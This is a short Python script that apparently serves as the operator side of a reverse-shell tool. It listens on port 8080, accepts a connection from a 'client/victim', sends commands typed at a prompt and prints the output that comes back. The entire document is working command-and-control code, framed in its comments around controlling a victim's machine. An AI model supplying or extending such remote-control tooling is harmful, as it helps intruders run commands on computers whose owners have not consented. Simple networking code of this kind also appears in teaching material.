import socket
import sys


def create_socket():
    try:
        global host
        global port
        global sock
        host = ""
        port = 8080
        sock = socket.socket()

    except socket.error as msg:
        print(f"Socket creation error: {msg}")


def bind_socket():
    try:
        global host
        global port
        global sock

        print(f"Binding the port: {port}")

        sock.bind((host, port))
        sock.listen(5)

    except socket.error as err:
        print(f"Socket binding error {err} \nRetrying...")
        bind_socket()


# Establish / accept connection with a client (socket must be listening)
def accept_connection():
    # connection object
    # address = [IP Add, PORT]
    connection, address = sock.accept()

    print(
        f"Connection has been established! IP: {address[0]}  | Port: {address[1]}"
    )

    send_commands(connection)

    connection.close()


# Send commands to client/victim or a friend
def send_commands(connection):
    while True:
        command = input("Enter the command to send: ")

        if command == 'quit':
            sock.close()
            return

        if len(str.encode(command)) > 0:
            connection.send(str.encode(command))
            client_response = connection.recv(1024).decode('utf-8')
            print(client_response)


def main():
    create_socket()
    bind_socket()
    accept_connection()


if __name__ == "__main__":
    main()
